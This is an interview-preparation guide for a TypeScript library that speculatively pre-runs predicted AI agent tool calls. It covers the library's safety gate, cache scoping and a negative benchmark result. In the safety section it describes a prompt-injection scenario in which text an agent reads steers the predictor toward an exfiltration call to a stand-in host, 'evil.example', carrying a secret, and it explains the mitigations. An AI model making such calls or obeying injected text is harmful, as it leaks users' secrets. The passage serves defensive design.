# Interview guide

Likely questions about speculate-tools, with short answers. Numbers come from
[docs/benchmarks/](benchmarks/) and the main [README](../README.md); mechanisms are in [DESIGN.md](DESIGN.md) and
[SECURITY.md](../SECURITY.md).

## The 30-second pitch

"It's branch prediction for AI agent tool calls. While the model is thinking, a predictor guesses the next tool call;
if that call is provably safe, it runs in the background, and if the model then asks for exactly that call, the result
is already there. It's lossless: the agent sees exactly what it would have seen otherwise. I built it as a TypeScript
library with adapters for the Anthropic tool loop, the Claude Agent SDK and MCP. Then I tested it on 8,754 real public
coding-agent trajectories and found it saves about 0.1–0.2% of wall time, with a ceiling of about 1–2% even for a
perfect predictor, because coding agents spend most of their time generating, not waiting on tools. The interesting
part is why, and where it could still pay off."

## Core idea

**Q: Why is speculation lossless?**
Three mechanisms, each closing a different race:
1. *Safety gate*: only `read_only` tools ever run speculatively, so a wrong guess has no effect on the world. Unknown
   tools are `side_effecting`, and `side_effecting` cannot be allowed even by configuration.
2. *Exact matching*: a cached result is served only if the real call has the same tool name and the same canonical
   JSON arguments. No fuzzy matching, because two calls that look alike (`grep foo ./src` vs `grep foo src`) can
   produce different output.
3. *Freshness*: every non-read-only real call bumps an epoch and discards speculative state before and after it runs;
   validators fingerprint external state before the speculative run and re-check it at use; results expire after
   `maxAgeMs`.
If anything fails (predictor error, timeout, validator mismatch, a hook throws), the call simply runs normally. The
tests check byte-identical transcripts with deliberately wrong and malicious predictions.

**Q: Why invalidate both *before* and *after* a write?**
"Before" drops results computed before the write. "After" catches reads that were *in flight* while the write ran,
including one a real call had already joined. Either alone leaves a window for a stale read.

**Q: Why fingerprint state *before* the speculative run, not after?**
If a file changes while the speculative read is running, a fingerprint taken afterwards would match the new state and
bless an old result. Taking it first means any change during the run is detected at use.

**Q: What is a hit vs a join?**
A hit: the speculation already finished, so the call saves the whole tool time. A join: it is still running, so the
call attaches to it and saves the time already spent.

**Q: What does it cost when guesses are wrong?**
Compute, rate limits and money, never correctness. With `topK=3`, about 70% of speculative executions are wasted in
the simulator and ~98% on the real traces (140,793 wasted vs 2,586 hits). That is fine for local reads and not fine
for metered APIs, so there are `budget`, `topK`, `minScore` and `maxConcurrency` controls.

## Safety model

**Q: How do you decide a tool is safe to pre-run?**
Evidence in priority order: explicit overrides, then MCP annotations, then name/description heuristics, else
`side_effecting`. A mutating word (130 of them: `write`, `delete`, `send`, `push`, `exec`, ...) anywhere in the name
*or description* vetoes a `readOnlyHint`. For untrusted servers you turn off annotations and heuristics and pass an
allowlist. The design asymmetry: a false "side-effecting" only costs speed, a false "read-only" costs safety.

**Q: Why is `idempotent` not safe?**
Idempotent means f(f(x)) = f(x), not f(x) = x. A speculated `mkdir -p` or `pip install` really happens even if the
agent never asks. So it is opt-in, and a served or completed idempotent speculation invalidates other cached results.

**Q: Why are network tools opt-in?**
Prompt injection. A web page or issue the agent reads can contain text that steers the predictor (especially an LLM
predictor) toward a call like `fetch("https://evil.example/?q=<secret>")`. The agent itself would never make that call,
but speculation would. So open-world tools (MCP `openWorldHint`, network-ish names, URL-like argument names) are not
speculated unless explicitly allowed.

**Q: What about shell tools, where safety depends on the arguments?**
That is a real gap. `grep foo src` is read-only, `grep foo src > out.txt` is not. The evaluation classifies shell
calls per call from the parsed command, and found 11 exactly-predicted calls (with the idempotent opt-in) that a
name-only classifier would have launched unsafely. The library classifies per tool name, so shell tools need overrides
or should not be marked read-only. Moving argument-aware classification into the library is on the roadmap.

## Cache scoping

**Q: Can one user's speculative result be served to another user?**
Not if it is deployed as documented. One `Speculator` is one session with its own cache, history, epoch and budget.
`SpeculatorPool` gives each session id its own instance (LRU + idle-TTL eviction) and passes `ctx.sessionId` to
handlers for per-user credentials. Cache keys are SHA-256 hashes and arguments are not logged by default.

**Q: Any residual cross-session risk?**
A *shared* learning predictor can remember user A's argument values and *propose* them in user B's session. The call
runs with B's credentials and is only served to B, but it can show up in B's logs. That is why the pool takes a
predictor factory, so each session learns separately.

## The results

**Q: The simulator said ~11%. Why did real data say 0.1–0.2%?**
Amdahl's law. Speculation can only remove time spent in speculable tools. In the real timed sessions, the median think
time was 5.3 s and the median tool time 0.45 s, so a tool call is roughly 0.45 / 5.75 ≈ 8% of a step. Only ~41% of calls
are read-only, and those are the fastest tools (file views, `ls`, `grep`). The measured ceiling for a *perfect*
predictor is 1.8% of wall time (0.8% on the fully timed real-user subset), which caps the speed-up at about 1.02×.
The n-gram realizes about a tenth of that ceiling: 0.2%. The simulator assumed shorter thinking (1.8 s median), slower
tools (350 ms–9 s), scripted call patterns, and tool results in the history; real traces have none of those.

**Q: Why is the hit rate only 5.0% top-1 / 6.4% top-3?**
The n-gram picks the right *tool* 42.2% of the time but rarely the exact *arguments*. It is good at stereotyped calls
(`scroll_down` 55.5%, `git diff` 22.5% top-1) and at 0% on calls whose arguments are new text (`grep`/`find` command
lines). The public datasets also strip tool results, which disables its strongest mechanism (copying a path out of
the previous result). That caveat would move the hit rate, but not the ceiling.

**Q: How do you know the evaluation isn't leaking?**
The split is by trajectory, never by step, using a hash of the trajectory id, so no test trajectory is in the
training set. During replay the model keeps learning online, but only from steps that have already happened, which
a live deployment would also do. The
real-user subset was also evaluated held out, trained only on the other four sources (11.9% / 13.2%).

**Q: Did you find anything wrong with your own metrics?**
Yes. OpenHands has a no-op `think` tool. It is "read-only" and very predictable (65.1% top-1), and counting it raised
the overall top-1 from 5.0% to 8.2% while saving no time. It is excluded from the headline numbers; the raw report with
it is kept in `docs/benchmarks/real-all-with-think.txt`.

**Q: How confident are you in the latency estimate?**
It is an upper bound. It ignores concurrency limits, budgets, validator rejections and contention between speculative
and real work. Only one source (263 sessions) has wall-clock timings; the others use those medians. The conclusion,
that the ceiling is a few percent at most, holds even with generous assumptions, because it depends only on how
little time the read-only tools take.

**Q: Why publish a negative result?**
Because it is the most useful thing the project found. It tells you which workloads are worth trying, and it comes
with a tool (`eval:traces`) that computes the ceiling for anyone's traces before they build anything.

## Finding workloads where it pays off

**Q: Where would speculation actually help?**
Wherever a large share of wall time is spent in tools that are slow, read-only and predictable: web browsing and
deep-research agents (search and fetch take seconds and follow patterns like "search, then open the top results"),
remote sandboxes and remote MCP servers (network latency on every call), and slow read-only queries (database reads,
ticket lookups, code search across a large monorepo).

**Q: How would you test that?**
Cheapest first:
1. Collect real trajectories with per-step think and tool timings in the trace format and run `eval:traces`. Read the
   ceiling line first. If it is a few percent, stop.
2. Measure hit rates on held-out trajectories, keeping tool results so result-derived templates work, and with
   open-world tools allowed only under the policy you would really deploy.
3. Price the waste: the report counts wasted executions and their tool time.
4. Run a live A/B with speculation on and off: wall-clock p50/p90, cost, and task success, which must not change.

**Q: What breaks the moment you allow network tools?**
The exfiltration path above. The mitigations would be an allowlist of tools and domains, and preferring the n-gram
(which only copies previously seen values) over an LLM predictor (which can compose arbitrary strings) for those
tools.

## What next

**Q: What would you do next?**
1. Repeat the ceiling measurement on a deep-research or browsing workload under an explicit open-world policy.
2. Measure the LLM predictor (a local model through `OpenAICompatibleLLMClient`) on real traces: hit rate, its own
   latency (it eats into the think window), and cost.
3. Get trajectories that keep tool results, and move argument-aware shell classification into the library.
4. Replay against real sandboxes with speculation on and off to measure contention and real waste.
5. A live A/B on a SWE-bench Verified subset, checking the resolve rate is unchanged.

**Q: If you had to make it help coding agents anyway?**
The bound says read-only tools alone cannot. The levers are the idempotent class (tests and builds, which raised the
ceiling to 5.9% on these traces) with strict sandboxing, or pairing speculation with faster model serving, since
shorter think time raises the tool share (as long as the think window still covers the tool time). Both change the safety or the system, not the predictor.

## Engineering questions

**Q: How did you test something nondeterministic and concurrent?**
A virtual clock: a discrete-event scheduler that advances time only when every promise is blocked on a sleep. Races
can be scripted exactly, benchmarks are deterministic, and "identical transcript with and without speculation" is a
meaningful assertion. There are also randomized tests (2,000 hostile predictions; random read/write scripts) and
regression tests for every bug fixed in the hardening pass.

**Q: What was the nastiest bug?**
A throwing predictor `observe()` hook turned a *successful* real tool call into an error after the tool had already
run. An agent retrying that call would repeat a side effect. Speculation code must never be able to change the outcome
of a real call, so hook errors are now caught and counted in `metrics().internalErrors`.

**Q: How is it packaged?**
TypeScript, dual ESM/CJS build with type declarations for both, entry points `.`, `./mcp` and `./eval`, Node 18.18+.
The only runtime dependency is the MCP SDK, loaded only by `speculate-tools/mcp`. 136 Vitest tests plus 8 smoke tests
against the built package on Node 18/20/22 in CI; ~96% line coverage; a Docker image for the MCP proxy.

**Q: What did you use AI for?**
The project was built with Claude as an AI pair-programmer (stated in the README). Answer this one concretely from
your own experience: which decisions you made, what you asked Claude to do, and how you checked its output (for
example, the deterministic benchmark reports regenerate byte for byte, and every fixed bug has a regression test).
